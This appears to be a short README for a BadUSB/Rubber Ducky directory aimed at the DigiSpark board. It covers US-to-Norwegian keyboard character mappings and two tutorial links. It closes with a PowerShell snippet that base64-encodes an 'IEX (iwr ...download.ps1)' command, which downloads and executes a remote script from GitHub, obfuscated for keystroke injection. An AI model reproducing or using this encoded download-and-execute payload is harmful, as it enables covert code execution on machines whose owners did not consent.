This directory is for files directed to creating a BadUSB or RubberDucky.
The scripts are written for the DigiSpark USB mini Arduino board.
Code is added with the Arduino IDE.


Info: 
The USB writes directly to the keyboard, and the default is an American keyboard.
Use this list below to use the equivalent Norwegian keyboard options.
American Keyboard layout info
@ = "
- = /
) = (
( = *
/ = &
\ = =
: = >
; = <

Sources:
https://digistump.com/wiki/digispark/tutorials/connecting
https://www.secjuice.com/how-to-build-a-low-cost-rubber-ducky/

Encode Base64 command:

$String = "IEX (iwr 'https://raw.githubusercontent.com/helfiesp/Security/main/BadUSB/download.ps1')"

$bytes = [System.Text.Encoding]::Unicode.GetBytes($String)
$encodedCommand = [System.Convert]::ToBase64String($bytes)

Write-Host "Encoded command:"
Write-Host $encodedCommand
